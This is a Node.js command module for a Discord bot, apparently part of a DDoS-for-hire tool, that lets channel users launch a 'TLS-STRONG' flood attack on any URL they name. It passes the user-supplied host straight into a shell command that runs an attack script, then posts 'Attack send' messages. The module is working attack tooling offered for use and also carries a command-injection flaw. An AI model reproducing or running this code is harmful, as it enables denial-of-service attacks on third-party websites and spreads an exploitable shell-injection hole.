const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('TLS-STRONG')
	.setDescription("`Example .TLS-STRONG https://example.com/`")
	.setFooter("Don't attack web .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node TLS-STRONG ${host} 90 150`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('Attack discord ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **TLS-STRONG** 🚀')
	.setTimestamp()
	.setDescription("**► Attack send 💥**")
	.setFooter('© Developer: BlueCyber', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 90000); //time in milliseconds
var gifler = ["https://blarrow.tech/wp-content/uploads/2020/06/featureAYUSHDUBEY.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **TLS-STRONG** 🚀')
	.setTimestamp()
  .setDescription("**𝐔𝐬𝐞𝐫**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `TLS-STRONG` \n **𝐓𝐢𝐦𝐞**: `120`")	
  .setFooter('© Developer: BlueCyber', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['TLS-STRONG'],
  permLevel: 0
}

exports.help = {
  name: 'TLS-STRONG',
  description: 'Tank',
  usage: 'TLS-STRONG'
}